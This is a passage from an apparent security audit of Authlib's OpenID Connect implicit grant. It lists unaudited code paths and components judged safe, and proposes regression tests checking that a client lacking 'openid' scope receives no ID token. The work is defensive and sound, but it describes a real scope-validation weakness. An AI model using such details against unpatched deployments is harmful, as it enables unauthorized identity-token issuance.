- **Other paths through the same raw value:** beyond `create_granted_params()`, we did not audit every scope read in `process_implicit_token()` ([`authlib/oidc/core/grants/implicit.py:132-169`](https://github.com/authlib/authlib/blob/c529a61af40e3efe05286140e00fbdced07d7987/authlib/oidc/core/grants/implicit.py#L132-L169)), or in other OIDC grants such as the hybrid grant. Whether they share the pattern is not verified.
- **Already safe, no change needed:**
  - the scope filtering in the parent `ImplicitGrant` and in `ClientMixin`
  - `UserInfoEndpoint`, which rejects this client's access token with 403 `insufficient_scope`
  - the OIDC authorization code flow, which issues no ID token for this client

Suggested regression test, alongside the existing Flask OIDC implicit-grant tests:

1. Register a client with `scope='profile'` and `response_types=['id_token token']`.
2. Send an authorization request with `scope=openid profile` and a `nonce`, and approve it.
3. Assert that the response is an `invalid_scope` error ("Missing 'openid' scope") and that the redirect contains no `id_token`.

A second case should use a token generator that does not filter scope, and assert that the issued access token carries only the client's allowed scopes.
